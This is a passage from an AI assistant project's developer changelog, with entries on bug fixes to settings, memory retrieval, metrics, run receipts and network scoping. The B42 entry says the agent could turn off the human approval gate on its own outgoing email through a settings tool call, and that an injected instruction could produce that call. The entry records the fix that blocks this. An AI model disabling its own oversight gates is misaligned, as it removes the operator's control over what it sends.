mode picker, 0 is reachable as the documented "no trimming" value, and typing 6000 as a fixed budget is
refused with the setting's own advice. A test pins the sentinel against `context_budget.DEFAULT_BUDGET`,
because the two live in different files with nothing joining them.

`search_safesearch` had seventeen lines of documentation that reached nobody, including the two
exceptions nobody could have guessed — Tavily has no such knob, and a custom backend keeps its own
behaviour. Those are the sentences the panel now says out loud.

`teacher_tier2_enabled` deliberately keeps none: its card is hidden by a decision written in
`index.html`, and adding a switch for one field of a parked feature would re-open that decision
sideways. **This closes the last open `H` row** apart from `H21`, which is verified and parked under
`Law 1`.

### H19, H20 — four copies of one map, three of another, and a find bar with no door
`d02a645..HEAD`. **338 tracked, 134 done. Suite 7,294 → 7,314 passing.**

`/shortcuts` printed seven shortcuts against a runtime twenty-one, **invented two actions bound to
nothing anywhere**, omitted fourteen real ones, and gave the wrong combo for `toggle_sidebar` — which
the Shortcuts panel also got wrong, from its own second copy of the same table. One registry now,
exported from the module that runs and imported by the other two, with `/shortcuts` generated from it
and unbound actions skipped rather than printed with a blank key.

`H20` needed that first: Find is in the registry, the panel and `/shortcuts` both name it, and the
document header has a button beside Undo. The editor reads the keybind rather than hardcoding Ctrl+F,
because an entry the editor ignored would be worse than no entry — the panel would offer to change a key
and nothing would change. The global dispatcher still does not bind it; Ctrl+F outside a document is the
browser's.

`H19`'s other half landed in the same change. `hidden: true` filters from **both** `/help` and the
autocomplete, so the three diagnostics had no door; they are un-hidden into a `Diagnostics` category,
and `/sh` is safe to surface because its route is admin-gated server-side — hiding it was obscurity.

And `/toggle rag` exists. The row calls it a handler with no registry entry; it is also a handler that
could not have worked, because the `toggleMap` it reads had no `rag` key. **There were four copies of
that map** — one complete, three missing entries — which is the same disease as the keybind table, in
the same file, found while fixing it.

Fourth Law 20 trap this session, and the first one caught by my own test before it shipped rather than
after: two assertions matched a word that the comment recording the defect necessarily contains.

### B42 — the agent could take off its own gates
`0ea6486..HEAD`. **337 tracked, 132 done. Suite 7,280 → 7,294 passing.**

`H18` reads `agent_email_confirm` as a setting with no control. It is that, and it is also one the
**agent** could set: measured on the stored value, `manage_settings set agent_email_confirm false` moved
it True → False. The agent could remove the gate requiring a person to approve an email before it sends
— through a tool call indistinguishable from the operator's own request, which is exactly what an
injected instruction produces.

`_SELF_RESTRAINT_KEYS`, the same shape as the `_SECRET_KEYS` set already beside it. The refusal names
the setting, says where to change it, and says it survives being asked politely. `reset` is refused too,
even though it writes the safe default today, because "only in the safe direction" inverts the day
someone changes a default.

**`trust_rung` was in the first version and is not in the shipped one.** The write took effect, but
`allow_listed` asks in clean runs the default lets through, the rungs have no total order — the file
itself records an incident where the "stricter" rungs were less protected — and a deliberate test sets
the strictest rung from chat because a person asking for more confirmation is a real request. Six suite
failures caught it. One gate the agent could take off, not two. `P7-13`.

The trade only works because the person gains the control, so `agent_email_confirm` gets a switch in
Settings → Email that says in the panel that the agent cannot turn it off. `P7-12` is the loop caps,
deliberately left writable and left to the owner.

### H04, H16 — the manager gets pixels, and four keys get past the allowlist
`901ac61..HEAD`. **336 tracked, 132 done. Suite 7,244 → 7,280 passing.** `check-unreachable` 96 → 91.

`H04`: a finished, admin-gated embedding-model manager with no markup at all. Settings → Embeddings now,
leading with what is in use rather than with a list — because `fastembed` and `chromadb` are both
optional, a clean install has neither, and then memory and document search fall back to the keyword
scorer `B40` found ranking by "contains two consecutive capitalised words". A missing optional dependency
is a state with an explanation and an install line, not an error. Where a route refuses — deleting the
model in use, an endpoint URL that breaks a rule — its own words are shown rather than flattened.

`H16`: `DEFAULT_SETTINGS` is an allowlist, not a list of defaults. The settings route iterates it, so
four keys read by live code and absent from it were dropped from every save in silence. Declared with
the exact fallbacks their readers already used, clamped where they feed a loop, and given switches.
`tool_path_extra_roots` deliberately gets none — the row's own second option, and a test now fails if a
control appears without someone arguing for it first.

Two defect-pinning tests turned round rather than deleted, `H04`'s and `H10`'s. A ratchet that has run
out of real orphans to point at is exactly when its own fixture tests matter most.

### H12 — the vote history stops living in one browser
`0efc4d0..HEAD`. **336 tracked, 130 done. Suite 7,222 → 7,244 passing.**

The Scoreboard read browser storage while `POST /api/compare/record` wrote a server row nothing ever
read back, and `GET /api/compare/history` and `DELETE /api/compare/{id}` had no caller at all. Two
copies, drifting in both directions, and nothing saying which one you were looking at: clear your site
data and the visible history vanished while the server kept every vote; vote from a second browser and
the Scoreboard disagreed with itself.

The join is `server_id` — an id the record endpoint has always returned and the browser has always
thrown away. Costs and mode now travel with the vote, because they are what the Scoreboard needs and
the browser was their only holder. Clear History clears both. Every vote already in the table survives
the change, including the genuinely different blob shape the full comparison flow writes into the same
column — which is `P13-12`.

The Scoreboard now says whether it is showing the synced history or this browser's copy. That is the
row's real lesson: the numbers were never wrong, there were two of them, and a silent fallback would
have been the same defect with better plumbing.

### H13, Law 20 — the album verb, and the third grep that lied
`bbc41ec..HEAD`. **335 tracked, 129 done. Suite 7,211 → 7,222 passing.** `check-unreachable` 100 → 98.

The gallery could move images into albums since before the fork and never offered it. The row's own
correction was the useful part: the handle is the image bulk bar, whose `_selectedIds()` already returns
exactly the array the endpoint wants, so *Album…* is one more entry in a list. The picker is a second
page of the same dropdown rather than a second dropdown, remove is offered only inside an album, and
album names are the first user-supplied text this menu has ever rendered — so `textContent`.

`Law 20` is the session's third self-inflicted lesson, and the one that cost the most: `H02` asserted a
sentence was gone and the corrected comment quotes it; `H10` asserted `innerHTML` was absent and the
comment saying not to use it contains the word; `B41` asserted a line existed and it did — in a
different function, where the variable beside it was out of scope. A source file is code and prose about
code interleaved, and grep can tell you neither which it found nor what scope it landed in.

### H11 — you can now ask why a memory would fire, before sending the message
`b24f645..HEAD`. **335 tracked, 128 done. Suite 7,187 → 7,211 passing.**

The Brain's search box gets a second mode. *Contains* is the substring filter it has always been;
**Would fire** runs the real retriever and reports what it would return and why. `POST /api/memory/debug`
was live and callerless, and could only ever answer the *which* — the score and the boost were computed
and dropped on the scorer's last line. `explain_relevant_memories` keeps them; `get_relevant_memories`
is now a wrapper over it with its contract for five callers unchanged.

The reason that matters most is the one saying a memory was admitted at 0.9 **without being scored** —
invisible from the ranking, and exactly the behaviour that was hiding `B40`. Writing truthful reasons is
what found it.

The `timeline` and `by-session` routes are still unwired, and that is stated in the row rather than
papered over: neither is the `Verify`, and bolting them into this modal to close a row would be the
second scaffolding `Law 14` exists to prevent.

### B40 — the Brain ranked memories by "contains two consecutive capitalised words"
`96651e4..HEAD`. **335 tracked, 127 done. Suite 7,173 → 7,187 passing.**

Found while building `H11`, the row about showing a person *why* a memory fired — which is exactly the
view that makes this impossible to miss. `identity_words` contains `"i"`, and the check was a substring
test, so "what **i**s the weather" was an identity question and **ten of ten ordinary queries classified
as identity**. Every memory containing two consecutive capitalised words — *Bridge Street*, *Docker
Compose* — was then admitted at 0.9 ahead of anything scored on similarity, and identity memories were
excluded from scoring entirely otherwise, so `Afrog Labs` could not retrieve *"Joseph Jeffrey works at
Afrog Labs"*.

Reproduced with nine memories: *"what is the build timeout"* did not retrieve the memory containing the
answer at `top_k=5` or `top_k=8`. It now leads. And this is not a fallback nobody hits — ChromaDB is an
optional dependency, so on a clean install this scorer is the only memory retrieval there is.

The deliberate half is untouched: identity memories still bypass similarity for genuine identity
queries, exactly as the original comment asks. `P13-11` is the two judgements this did not make.

### H10 — session cleanup had a dry run and no door
`fbb7092..HEAD`. **334 tracked, 127 done. Suite 7,162 → 7,173 passing.**

`GET /api/cleanup/preview` and `POST /api/cleanup` have been live and owner-scoped with no caller in
`static/` at all. The preview is the reason this belongs above the Danger Zone rather than in it: it
names what it would archive, what it would delete, and what it is sparing **with the reason**. All three
groups render; Run stays hidden until a preview finds something; the confirm is `danger` only when a
deletion will actually happen. The row's "under-10-message" was wrong — the constant is 20 — and the
panel's prose is now asserted against the constants so it cannot drift.

Two things recorded rather than fixed: a flat `app.routes` walk claims these routes are unmounted (they
are not — this FastAPI wraps included routers, the same false alarm that shaped `check-unreachable.py`),
and `initRag`/`initWebhookForm` are ~250 lines of `admin.js` that were dropped from the init list rather
than deleted. The second is worked triage for `P3-20`, and it means `H16`'s "webhooks UI is absent" is
really "webhooks UI is unmounted".

### B39 — Ollama was the only route where the prompt and the transport disagreed
`16a0351..HEAD`. **334 tracked, 126 done. Suite 7,148 → 7,162 passing.**

Filed as needing the owner, then measured, and the measurement made it a bug rather than a decision.
On a default Ollama endpoint no schemas are sent, the fenced parser is the only live channel, and the
compact prompt told the model not to use it — every tool unreachable, in silence. The apparent trade
(prompt size on the machines with least room) turned out not to exist: llama.cpp with a `gpt-oss` model
is also `is_api_model=False` and already gets the full fenced prompt. Ollama was the anomaly.
Measured across seven route shapes before and after: `compact=is_api` changes the two Ollama rows and
nothing else. `P3-22` is what is still missing — no way for an admin to declare `supports_tools`.

### H08, H09 — two prompts and a cap that told the model something untrue
`fae4a12..HEAD`. **333 tracked, 126 done. Suite 7,033 → 7,148 passing.** One suite run verified both
rows, so they are one commit: a tree that was never tested alone should not be a commit on its own.

`H08`: local inference lifted the agent's round limit to 100,000 and the stream timeout to 24 hours,
which is right on your own GPU — but it did not tell a shipped default from a number a person entered.
`agent_max_rounds` is validated to 1..200 by the admin endpoint and re-clamped in `chat_routes` with a
comment about defending against hand-edits, and then replaced. `setting_is_explicit` again, third
caller. The off-switch, which appeared nowhere outside the module that read it, is now in `.env.example`.

`H09`: `generate_image` and `manage_research` are the only members of `TOOL_SECTIONS` with no
`FUNCTION_TOOL_SCHEMAS` entry, so no schema was sent and the fenced fallback was shut — both channels
closed, both names offered, to a model the same prompt tells to say what is missing instead of
pretending. Fixed as the guard the row asked for rather than as two names.

Two things came out of it that belong to the owner. `B39`: on a **default** Ollama endpoint no schemas
are sent at all and the compact prompt still goes out, so the model is told to use native calls it does
not have and not to write the fenced syntax that is the only channel being parsed. `P3-21`: the same
lift flattens every preset's `max_tokens` to 1,000,000, which makes the preset picker cosmetic on local.

`B38` is mine. Extracting `_resolve_local_lifts` left a `NameError` in the hot loop that 20 tests, 16
mutations and eight checkers were all green for — the test covering the call site matched source text,
and the text was correct while the name was not in scope. 96 full-suite failures found it.
`test_agent_loop_names_resolve.py` resolves every free name in every top-level function of
`agent_loop.py`, and found a second thing on its first run: a lambda parameter its own walker missed.

### H06, H07 — a fallback written as a default argument fires on absence, not on blank
`60e1387..HEAD`. **332 tracked, 124 done. Suite 6,991 → 7,033 passing.**

`PANTHEON_TASK_CONCURRENCY_CAP` had never worked on any install: the resolver asked "did the operator
set this?" with `get_setting(KEY, None)`, and `load_settings` merges the defaults on every read, so
the env leg beneath it was unreachable code from first boot. CardDAV asked the same question with
`settings.get(k, os.environ.get(K, ""))`, and Remove writes three empty strings. Neither existing
helper could fix it — `is_setting_overridden` is blind after a save, `budget_is_explicit` is blind
before one — so `setting_is_explicit` is both, and `env_backed` is the string form. Ten more latent
instances in the mail config are fixed before they fire.

None of it was caught because `check-wiring.py` read only literal `getElementById` and this codebase
reaches for elements through a helper at 925 call sites. Blind spot 4 closed: `--max 9` → `--max 124`
with no product code changing. The backlog is `P3-20`. `Law 19` is the cost of learning that a suite
run is evidence about the tree it started with.

### H02 — 475 lines of assistant behind two doors that did not open
`2d378d8..60e1387`. **Suite 6,975 → 6,991 passing.**

`openAssistantChat()` had zero callers repo-wide, and the gear that reached the settings modal was
built by a poll gated on `sessionModule.getActiveSession()` — a method that occurs exactly once in
this repository, at that call site. So the poll's only effect was 120 wasted ticks per page load.
A rail button now calls the chat, and the gear rides a new `pantheon:session-changed` event instead
of a timer. The comment claiming the views had moved into `tasks.js` is corrected, not deleted:
that sentence is why nobody looked.

### H03 — four advertised actions, four URLs that did not exist
`bc2571c..HEAD`. **Suite 6,975 → 6,991 passing.**

`edit_image` offered upscale, rembg, inpaint and harmonize, and posted all four to
`/api/gallery/{action}` — none of which is a route. Every call 405'd and the model was told
"upscale failed", with no hint the URL was wrong. All the capabilities were real under other names,
with three different body shapes; `inpaint` needs a mask a tool call cannot draw and is no longer
advertised.

### H14, H15, H17 — three sentences the product was telling that were not true
`e0e69a3..HEAD`. **Suite 6,962 → 6,975 passing.**

A tooltip naming a gesture that does not open the SIGKILL panel; a Settings search that indexed 13
panel labels and none of the 96 controls, leaving the app's only privacy control unfindable by any
word in its own label; an admin switch wired to the endpoint whose own docstring calls it unsafe,
and a webhook secret you could copy but not rotate.

### P3-15 — the audit, as a script, and the fix that ate half a file
`30bbff6..HEAD`. **Suite 6,939 → 6,962 passing.**

`.pantheon/check-unreachable.py` rediscovers `H04` and `H10` from a clean checkout with no hints,
which is the row's `Verify` line. Getting there needed the walk to follow `original_router` — the
naive recursion reports 23 of 443 routes while looking correct — and needed `check-wiring`'s three
blind spots closed first, one of whose fixes silently deleted 55% of `gallery.js` before the test
that measures output length caught it.

### H05 — seven switches that did nothing, and the one line that undid the eighth
`ffb88f2..HEAD`. **Suite 6,913 → 6,939 passing.**

A feature is three things — a tool the agent can call, a route that answers, and a button — and the
flags governed only the button. They do all three now. The client-side half did not work either:
the fetch hid nine elements and `applyUIVis` showed seven of them again in the same callback, both
halves deliberate, which made it a question of precedence rather than ordering.

### H01 — the screen the agent had been promising for a year
`044b233..HEAD`. **Suite 6,868 → 6,913 passing.**

Three places said an approval surface existed — a route comment, a docstring, and the model's own
tool description, which told users their mail was waiting for them there. None of them was true.
Building it found the defect the card would have inherited: the endpoint returned the message
without its recipients, so the first thing anyone approved would have been a blind copy they could
not see.

### P15-06 — the operator's own machines are not a destination
`682ace6..HEAD`. **Suite 6,829 → 6,868 passing.**

The precondition turned out to be the interesting part: routing the local-first services through the
limiter is a performance regression until loopback, private space and the tailnet are paced at zero,
and `.pantheon/check-outbound.py` then found four unpaced calls to hosts that already throttle us —
including the DuckDuckGo fallback, where a 429 was being recorded and never honoured.

### P15-10 — the fix was easy; the checker was the row
`994afd7..HEAD`. **Suite 6,807 → 6,829 passing.**

Every recurring job is spread now, but the finding that mattered is that the row's own hand audit
undercounted by more than half: `.pantheon/check-jitter.py` found twelve more sites, two of them
real, and then caught five stale entries in its own author's allowlist on the first run.

### P15-09 — the clock you persist is not the clock you read it back with
`f093f26..HEAD`. **Suite 6,782 → 6,807 passing, the same 19 failing.**

Cooldowns survive a restart, which required storing a wall-clock deadline rather than the monotonic
reading held in memory — the naive version works on a box that only restarted the app and fails on
the one that rebooted, which is the only case the row is about.

### P16-19 — the push half, and every bug in it is silent
`d94d257..HEAD`. **Suite 6,711 → 6,782 passing, the same 19 failing.**

One address that ships empty and is enforced empty, one set of collectors feeding two wire formats,
and a JSON encoder written by hand because every mistake it can make — a uint64 as a number, a `NaN`
token, a `200` that delivered nothing — is accepted locally and lost at the collector.

### P4-27 — the interesting bug was over-redaction
`cdbda76..HEAD`. **Suite 6,704 → 6,711 passing, the same 19 failing.**

A receipt you can hand to someone, built by extending `P16-14`'s bundle rather than growing a second
exporter — "make something a person can hand over, with nothing of theirs in it" already had an
owner.

**The bug worth reading was over-redaction.** A `run_id` is 32 hex characters, exactly the shape the
opaque-string rule catches, so the first version redacted the one field that lets two people point
at the same run — a document whose subject was `<redacted>`. Redaction is field-by-field now with an
identifier exemption: redacting a serialised blob cannot tell an endpoint's hostname from a run's
identity and treats both the same.

**A mutation survived and was worth more than the ones that didn't.** My credential test asserted on
an endpoint label — which `events._safe_label` already sanitises at write — so it passed with this
module's redaction removed entirely. It proved the earlier layer, not this one. It asserts on a
skill name now: operator free text that nothing else touches.

**`B34`, closed at the right level.** `mark_turn_start()` is idempotent within a turn, which is
correct in production and a trap under pytest where everything shares one context. A helper that
seeded a run left the ContextVar set, and another module's test went red *only when the two happened
to sort in that order*. Fixed in `conftest.py` with an autouse reset — fixing the one offending
helper would have left the trap armed for whoever writes the next one.

### P4-28 and P14-04 — the classification is the product
`4b97fd5..HEAD`. **Suite 6,681 → 6,704 passing, the same 19 failing.**

Two receipts differ in dozens of ways that mean nothing. A diff that lists them all is one nobody
reads twice — worse than no diff, because it was paid for. So every difference is **chosen** (the
operator asked), **inflicted** (the world moved), **outcome** (what the run produced), or **noise**.

`P4-26`'s `deliberate` field is what lets chosen and inflicted be told apart rather than guessed
from the shape of the change — the return on having recorded it two rows ago. And the tool hash from
`P4-25` earns its keep here: a schema that changed under an unchanged name is invisible without one.

**The headline leads with the unasked-for changes**, and that ordering is the argument — putting
outcome first buries the cause under its own consequences.

`P14-04` then had almost nothing left to do, which was the point of the sequencing. A failing eval
case now carries the diff's headline and the inflicted differences: *"case 3 failed"* sends someone
to read a transcript, *"case 3 failed, and the tool schema changed"* is the answer. Failures only —
diffing passes doubles the cost of a green suite to produce something nobody opens.

**A gap found while building it:** `P4-26` recorded `replay` rows carrying the link back to the
original run, and `receipt()` dropped them on the way out. Stored, and unreadable through the only
API that reads receipts.

### P14-03 — the thing that replaces the vibes
`7994d28..HEAD`. **Suite 6,660 → 6,681 passing, the same 19 failing.**

A suite is a list of `run_id`s and what the operator expects; running one is `replay()` in a loop.
No case store, no runner, no second copy of the configuration — `P4-25` and `P4-26` had already
built all three.

**Assertions are deterministic and the operator writes them.** Not a judge model: a harness whose
first answer to "did that change help" is itself non-deterministic has replaced vibes with dearer
vibes. `P14-08` is filed for when a judge earns its place, with the questions to settle first —
whose model, at what temperature, paid for by whom.

**The decision that matters: a case that could not be reproduced is neither a pass nor a fail.** It
is skipped and counted separately. Folding it into *failed* makes a broken environment look like a
regression; folding it into *passed* is worse, because it is quiet. A suite where nothing ran
refuses to print a rate at all.

**Checks are an allowlist**, so a typo refuses the suite before a model call rather than silently
never running — a suite passing for the wrong reason is the one failure mode of an eval harness that
costs anything, because nobody investigates a pass.

One mutation survived and found a decorative defence: `score_case` ended `else error is None`, which
reads like it handles the errored case and is unreachable whenever there is one.

### P4-26 — a re-run is what proves the receipt was enough
`7f10ad8..HEAD`. **Suite 6,638 → 6,660 passing, the same 19 failing.**

`rerun_plan()` reads a receipt and says what it would take; `replay()` runs it as a new run that
links back. GET is free so the claim can be checked before a model call is spent on it.

**A receipt is not enough on its own, and that is by design.** `P4-25` keeps message content out —
which is what makes one portable — so a replay joins the receipt's configuration to the session's
inputs, and **a receipt exported to somebody else cannot be re-run by them.** Stated in the drift
line rather than discovered later by someone running a shorter conversation.

**Drift is the product.** "Same configuration" is a claim; a model can be gone, a skill edited, a
confidence moved. Substituting silently would make every answer this row exists to give a lie, so
the plan reports what it cannot reproduce and the replay records it — letting `P4-28` tell a
difference that was *chosen* from one that was *inflicted*.

**A replay never touches the session.** It is a diagnostic; appending its output would change the
thing being measured and put a machine-generated turn in front of the person next time they
scrolled up.

**Correction first (`B33`):** `P4-25` recorded a config for streamed turns only — `/api/chat` never
streams, so half the chat surface had `config: null`, and my test grepped the file for the call,
which one entry point satisfies. One helper, all three entry points, before the cache check. Fixing
it then reproduced `B32` in a new file, which this time raised loudly because the guard moved inside
the helper. The scope test is parameterised over every capturing module now — *a test written to the
shape of one bug catches one bug.*

`P14-03` is unblocked: a case is a receipt, a run is a re-run, and the harness is now scoring
replays rather than building a store.

### P4-25 — the three things that explain why two runs differ
`ac53d94..HEAD`. **Suite 6,617 → 6,638 passing, the same 19 failing.**

Re-measured before building, as the row's own corrected premise demands. It said five of eight items
persist; after `P14-01` and `P14-02`, **seven** do — the loop instrumentation picked up approvals and
tool outcomes on its way past. The remainder is exactly three, and they are the three that explain
why two runs of the same thing come out different: **resolved sampling parameters, the tool schemas
actually sent, and which skills were injected at what confidence.**

**No third store.** `events` gains a `run_id`, one `run_config` row per turn holds the three, and a
receipt is a range scan over rows that were already being written.

**Tool schemas are name + hash, not the schemas.** The point is to make a *change* visible; full
schemas are kilobytes each and dozens per turn, and `P4-28`'s diff reads a changed hash exactly as
well as a changed blob. Order-independent, because a shuffled tool list is not a different
configuration and a diff that claims otherwise gets ignored.

**No message content reaches a receipt** — which is the whole of what makes `P4-27` possible. Sampling
is an allowlist, because the payload it filters contains the prompt.

**`B32`, caught before it shipped:** the skills capture referenced a name that isn't in scope there,
and the `except Exception` that keeps a receipt from breaking a reply would have swallowed the
`NameError` forever — recording nothing, silently. The guard that makes instrumentation safe is the
same guard that makes broken instrumentation invisible. There is an AST test resolving every name at
that call site now.

**And `P14-03` is blocked, checked rather than assumed.** `P14-04` says a saved case *is* a receipt
and a run *is* a re-run. Building a case store now would be the second scaffolding that row exists to
prevent. `P4-26` is the real prerequisite.

### P14-05 — what did last Tuesday cost
`3fed404..HEAD`. **Suite 6,598 → 6,617 passing, the same 19 failing.**

The question that started `P14`. The session row always knew a conversation's total; it threw the
timestamp away. `usage_over_time()` returns daily buckets by model and by owner, and a collapsed
panel in Settings draws them.

**Quiet days are filled in**, and that is the property worth naming: a series that omits a day with
no traffic draws a straight line from Monday to Wednesday, and a gap that reads as continuity is the
one way a usage chart actively misleads.

**Only `llm_round` rows are counted** — `P14-02` put tool calls and retrievals in the same table, and
a usage number that silently includes them reconciles with nothing. Models are ordered by cost, not
name. Unattributed rounds are labelled rather than dropped.

**No charting library.** One series of daily totals, inline SVG, DOM calls — vendoring a dependency
to draw rectangles is a dependency for what the browser already does. The bars carry an accessible
name with the numbers in it.

**And the fold with `P12-08` is undone, on evidence.** That row needs the operator's limit *field* to
sit next to, and `P12-07` — the admin surface that would hold it — is not built. The fold assumed
both halves would land together; only one could, and a folded row cannot be half-ticked. `P12-08` is
open again with the dataset already built for it.

`B31`: a test of mine sliced "everything between two functions I know about" and blamed the
self-check panel for code that landed in the gap — failing on a *comment* that said "never
innerHTML". Brace-matched and comment-stripped now, and still red when the real violation returns.

### P16-16 — two segments, and a run that cannot cross between them
`1d43204..HEAD`. **Suite 6,574 → 6,598 passing, the same 19 failing.**

Discovery returned one flat list of hosts with no notion of which network anything was on, so there
was nothing to scope. `src/networks.py` gives segments names, hosts, CIDRs and trust, and binds a
run to a set of them.

**Ships declaring nothing, and nothing declared changes nothing.** `Law 16` is about defaults, not
capability — a network the operator *named* is one they linked.

**Enforced at three independent layers**, because a caller that skips one should still be caught:
the URL gate, the pinned fetch path, and both limiter `acquire` paths. **Refused before DNS** —
rejecting after a lookup has told the other network's resolver we asked is a boundary that leaks the
question it exists to prevent.

**A host in no declared network is refused too.** "I could not classify it" is not a reason to
permit reach.

**CIDRs classify; listed hosts are scanned.** A `/16` is 65,536 addresses, and expanding a
declaration into a sweep is how "discover my networks" becomes a port scan someone's IDS reports.

**And what it does not do is written down rather than implied.** It is not an OS-level control: a
shell tool running `curl` reaches whatever the process has a route to. That needs a network
namespace, not a Python function — filed as `P16-20`, with a test that fails if the disclosure is
ever removed. A boundary described as tighter than it is, is worse than one described accurately,
because people plan around the description.

### P16-12 — a scrape has no destination
`e94a42c..HEAD`. **Suite 6,549 → 6,569 passing, the same 19 failing.**

`GET /metrics`, off by default. Point Prometheus at it and Grafana shows throughput, token cost,
turn latency, tool failures, retrieval misses, unanswered approvals, self-check state, outbound
cooldowns and queue depth.

**`Law 16` clause 4 is satisfied by the shape of a pull, not by a promise.** There is no collector
address in the module and no place for one; a test walks the AST and fails on an outbound import or
a `://` literal.

**No `prometheus_client`.** The exposition format is a name, labels and a number — taking a hard
dependency to do string formatting, here, would be the wrong trade.

**Everything is a gauge, and that is the decision worth reading.** A counter must be monotonic, and
retention pruning makes a `_total` from the events table decline *gradually* as rows age out —
neither a reset nor a real rate, and `rate()` over it is wrong in a way nobody notices. The windowed
numbers say their window in the name.

**Auth reuses the API-token system** rather than building a second one: a read-only `metrics:read`
scope, which Prometheus sends natively. Disabled returns 404, not 403 — off should look like never
built.

**And a defect caught before it ran anywhere (`B30`).** The scrape called `run_self_checks()`
every time, and one of those checks asks the embedding server over HTTP whether it is alive. At a
15-second interval that is 240 requests an hour to the operator's own machine — the exact thing this
module refuses liveness probing to avoid, one layer down where its own test could not see it. Cached
for 60 seconds now, with the age exposed so nobody reads a cached number as live, and a test that
stubs `socket` and fails any collector that reaches the network.

Three mutations survived, and two were the same trap in a new place: **the module's own docstring
being read as code.** It explains at length why `requests`, `service_health` and `prometheus_client`
are absent, so a substring search found those words in the prose — and then the same thing hid a
**deleted scope gate**, because the handler's docstring names `metrics:read`. Both parse the AST
now. The third found the `# TYPE` de-duplication guard to be dead code; it is kept and tested
directly, because declaring a metric inside its own loop is the natural mistake and a duplicate
`# TYPE` is a parse error in strict scrapers.

The push half — OTLP to an operator's collector — is `P16-19`, filed rather than folded in.

### P14-02 — the rest of the loop, and a metric that would have lied
`52d5b11..HEAD`. **Suite 6,530 → 6,549 passing, the same 19 failing.**

Latency, tool calls, retrieval and approvals all land in the same table `P14-01` opened. `events`
gains a `name` column through a real migration — `create_all` creates missing tables and never
alters one, and this table shipped a commit ago.

**The metric that would have lied.** Counting only tool *exceptions* would have reported a 0%
failure rate, because almost every tool in this codebase reports errors by returning
`{"error": ...}`. A reassuring number is worse than no number. `ok`, `error` and `exception` are
three outcomes.

**Retrieval keeps `unavailable` and `empty` apart.** Nothing came back because the store is down,
and nothing came back because nothing matched, look identical to a user and are different bugs.

**Latency is honest about what it measures** — the whole turn, tool calls and retries included, not
time in the model — and a missing measurement is `NULL`, never `0`. Zero would sit in a dashboard
looking like the best turn ever recorded.

**Queue depth is not here, and the row's framing is corrected rather than quietly satisfied.** It is
a gauge, not an event; writing it into an append-only log would be sampling something you can just
ask for. It belongs in `P16-12`'s scrape endpoint.

**And two bugs in `P14-01`, found by reviewing it a day later.** Pruning never ran on a freshly
booted machine — `_last_prune = 0.0` against `time.monotonic()`, which counts from boot (`B28`).
And `usage_summary` pulled every event in the window into Python to add integers, on a table
designed to accumulate (`B29`). Both fixed, both with tests that catch the original.

### P14-01 — the time dimension, written down
`797b832..HEAD`. **Suite 6,512 → 6,530 passing, the same 19 failing.**

`Session` carried `message_count` and token totals as **running counters on a row**. So Pantheon
knew what a conversation had cost in total and could never say what it cost on Tuesday, whether one
model was cheaper than another, or whether a change helped. The query was never the hard part. The
event was not recorded.

`Event` now is: ts, kind, session, owner, model, endpoint, tokens, duration, outcome, detail.
Written from `accumulate_token_usage` — the one place four call paths already converge, which is
what the 2026-08-27 premise correction bought — and **before its early return**, because
`if not (in_t or out_t): return` is precisely what discards failed rounds.

**Its own database session, swallowing everything.** Measuring is worth nothing if the measured
thing stops working, and the counters worked before any of this existed.

**Shape, never content** (`D-2026-09-01-02`). No prompts, no responses, no thinking — which is what
makes `session_id` a plain column rather than a cascading foreign key. Deleting a session removes
the conversation; keeping its rows leaks nothing the deletion was for, and *"what did last month
cost"* survives tidying up. Retention ships finite at 90 days.

`duration_ms` is present and NULL. Round latency is not available at this insertion point; that is
`P14-02`, and the column ships now so that row needs no migration.

**Two survived mutations, both the same shape as always.** The zero-token test called the recorder
directly, so moving the write below the early return passed cleanly — the placement *is* the
behaviour. And nothing caught the terminal paths dropping `outcome="error"`, which files every
failure as a success in the one column that makes failure countable.

**And a bug the suite found that isolation never would: 18 tests passed alone, 10 failed together.**
The suite runs on `sqlite:///:memory:`, where every new connection is a *new empty database* — they
had been leaning on one pooled connection surviving the run. Each test builds its own file-backed
database now, which also stops them writing to and pruning the developer's real one.

### P16-10 — self-hosted search, and the sentence no setting can make true
`8cf6c6e..HEAD`. **Suite 6,505 → 6,512 passing, the same 19 failing.**

When a pinned SearXNG search returned nothing, the third retry dropped the `engines` parameter — and
`use_default_settings: true` handed the query to Google, DuckDuckGo, Brave and Startpage. The exact
engines an operator excluded *by pinning*. Silently, logged at INFO as a detail.

**The gate:** behind `searxng_widen_engines`, shipping off, registered in all five places. Not
removed — the same shape as `P16-01`'s inverted opt-out. The refusal names the engines tried, what
widening would reach, and the setting to flip.

**The documentation, because the gate cannot make the honest sentence true.** SearXNG has **no index
of its own**. Self-hosting it means the *aggregator* runs on your hardware, never that the searching
does — queries reach other people's engines by definition, and no setting changes that. `docs/setup.md`
now says so, along with the fact that the shipped pin `bing,mojeek,presearch` was chosen because the
usual defaults are CAPTCHA-blocked on a fresh instance, not because those three are more private.

Restricting engines in SearXNG's own config is the stronger guarantee and is documented as the
by-hand change. It is not shipped: the news category pins no engines, so a `keep_only` list tuned
for general search silently breaks news, and a default that breaks a working feature is worse than
the one it replaces.

**And a dependency nobody had checked.** `P16-12` says its source is `P14-01`'s events table.
`P14-01` is not done and that table does not exist — 30 tables in `core/database.py`, none of them
this one, and token totals are accumulated in memory and never persisted per request. Round latency
and token usage have nothing to read. The row stays **open behind `P14-01`** rather than being
half-ticked; what could ship today is a scrape endpoint over the self-checks, limiter and liveness
data that already exist and already have no reader, and that is a different row.

### P16-13 — the guard, armed before there is a hole
`055d2a8..HEAD`. **Suite 6,493 → 6,505 passing, the same 19 failing.**

`P16-12` will create the first legitimate place in this codebase for an outbound metrics URL, and
therefore the first place a well-meant default could land. `.pantheon/check-destinations.py` exists
so the answer is already no, and it is in CI beside the other ratchets.

**Allowlist over shape, not a denylist of vendor names.** Any absolute URL that ships as a default —
`DEFAULT_SETTINGS` at any nesting depth, `.env.example`, compose environment defaults — must be
local, an obvious placeholder, or listed with a written reason. `ALLOWED` ships empty. Every
telemetry vendor was new once, and the one that matters is the one nobody has heard of yet; the
known-host list survives as a cheap second layer with its weakness written into the file.

Baseline measured before ratcheting: **zero** absolute URLs in `DEFAULT_SETTINGS`, and all 32
elsewhere are loopback, RFC1918, tailnet, `host.docker.internal`, a compose service name, or
`your-domain.com`. `not ip.is_global`, not `is_private` — a tailnet is `100.64.0.0/10`, and that
mistake has already been made here once.

**Half the tests assert it does not fire.** A guard that cries wolf is a guard people learn to route
around, and `.env.example` legitimately links to Google's OAuth docs and quotes a Gmail scope
spelled as a URL. Both fired on the first version.

One mutation survived, and it was worth more than the four that did not. I had added a
`COMPOSE_DEFAULT` regex to close the `${VAR:-…}` hole; putting the hole back broke nothing, because
